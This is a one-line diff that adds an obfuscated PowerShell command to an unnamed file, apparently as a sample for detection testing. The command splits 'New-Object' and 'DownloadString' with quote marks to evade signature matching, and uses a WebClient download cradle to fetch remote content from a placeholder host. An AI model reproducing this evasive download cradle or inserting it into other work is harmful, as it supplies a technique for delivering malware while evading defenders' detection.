@@ -1,0 +1,1 @@
+powershell.exe -C (New-"Object"     Net.Webclient).Down"loadS"tring(server.org/my.file)
